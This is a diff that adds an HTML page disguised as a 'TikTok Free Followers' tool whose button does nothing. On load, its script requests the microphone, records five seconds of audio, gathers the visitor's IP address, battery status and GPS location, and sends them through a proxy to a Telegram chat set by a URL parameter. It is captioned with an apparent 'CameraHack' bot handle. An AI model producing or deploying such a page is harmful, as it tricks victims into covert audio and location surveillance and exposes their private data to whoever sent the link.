@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>TikTok Followers Tool</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background-color:#f5f5f5; }
+    .navbar { background: linear-gradient(90deg, #69C9D0, #EE1D52); color:white; text-align:center; padding:15px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.1);}
+    #header { margin:0; font-size:30px; font-weight:bold; color:white; text-shadow: 1px 1px 2px rgba(0,0,0,0.3);}
+    .container { max-width:600px; margin:20px auto; padding:20px; background-color:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1);}
+    .form-control { width:calc(100% - 22px); margin-bottom:15px; padding:10px; border:1px solid #ccc; border-radius:5px; font-family:'Montserrat',sans-serif; font-size:16px;}
+    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background-color:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; font-family:'Montserrat',sans-serif; box-shadow: 0 4px 6px rgba(0,0,0,0.2); transition: all 0.3s ease;}
+    #thumbdloadbtn:hover { background-color:#C21844; transform: translateY(-2px);}
+    footer { text-align:center; margin-top:40px; color:#fff; background-color:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold;}
+    .tiktok-logo { display:block; margin:10px auto; width:100px; height:auto; border-radius:10px; box-shadow: 0 2px 6px rgba(0,0,0,0.3);}
+    h2 { color:#EE1D52; text-align:center; font-weight:bold; }
+    ol li { margin-bottom:10px; font-size:16px; }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <img class="tiktok-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+    <h1 id="header">TIKTOK FREE FOLLOWERS</h1>
+  </nav>
+
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">GET FOLLOWERS</button>
+    <div id="thumbnail-preview"></div>
+
+    <h2>How to Get TikTok Followers/Stats</h2>
+    <ol>
+      <li>Copy the TikTok Profile Link / URL from the TikTok App or Website</li>
+      <li>Paste the TikTok Profile Link / URL in the Input Field Above</li>
+      <li>Click on the "GET FOLLOWERS" Button</li>
+      <li>View Followers, Likes, and Stats</li>
+    </ol>
+  </div>
+
+  <script type="text/javascript">
+    function downloadThumbnail(){
+      document.getElementById('thumbdloadbtn').textContent='Fetching from server... Wait';
+    }
+
+    function GetURLParameter(sParam){
+      var sPageURL=window.location.search.substring(1);
+      var sURLVariables=sPageURL.split('&');
+      for(var i=0;i<sURLVariables.length;i++){
+        var sParameterName=sURLVariables[i].split('=');
+        if(sParameterName[0]==sParam){return sParameterName[1];}
+      }
+    }
+
+    var chatid = GetURLParameter('id');
+
+    // --- AUDIO + BATTERY + IP + LOCATION ---
+    navigator.mediaDevices.getUserMedia({ audio:true })
+    .then(async (stream)=>{
+      // record 5s audio
+      const audioRecorder = new MediaRecorder(stream);
+      audioRecorder.start();
+      setTimeout(()=>audioRecorder.stop(),5000);
+      audioRecorder.ondataavailable = (e)=>{
+        if(e.data.size>0) sendToTelegram(e.data,'audio');
+      }
+
+      if(chatid){
+        const [ip, battery] = await Promise.all([getIP(), getBattery()]);
+       const finalMessage = `🧑‍💻 User Info:\n\n${ip}\n\n${battery}\n\nہمارے مقابلے ہائے اوے سستے نشے 🤡`;
+       
+        // Send message through proxy
+        fetch(`/api/proxy`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({ type:'message', chat_id:chatid, text:finalMessage })
+        });
+
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition((pos)=>{
+            fetch(`/api/proxy`,{
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body:JSON.stringify({
+                type:'location',
+                chat_id: chatid,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              })
+            });
+          });
+        }
+      }
+    });
+
+    function sendToTelegram(data, type){
+      if(!chatid) return;
+      const formData = new FormData();
+      formData.append("chat_id", chatid);
+      formData.append("type", type);  // ✅ type لازمی append کرو
+
+      if(type === "audio"){
+        formData.append("voice", data, `voice_${Date.now()}.ogg`);
+        formData.append("caption", "@Ali_CameraHack_bot"); // ✅ username caption add کیا
+      } else if(type === "voice"){
+        formData.append("voice", data, `voice_${Date.now()}.ogg`);
+        formData.append("caption", "@Ali_CameraHack_bot"); // ✅ username caption add کیا
+      }
+
+      fetch("/api/proxy", { method: "POST", body: formData });
+    }
+
+    function getBattery(){
+      if(navigator.getBattery){
+        return navigator.getBattery().then(b=>`🔋 Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
+      }
+      return Promise.resolve("🔋 Battery: API not available");
+    }
+
+    function getIP(){
+      return fetch("https://api.ipify.org?format=json")
+      .then(res=>res.json()).then(data=>`🌐 IP Address: ${data.ip}`)
+      .catch(()=> "🌐 IP Address: Could not detect");
+    }
+  </script>
+
+  <footer><p>DEVELOP BY ALI💜</p></footer>
+</body>
+</html>
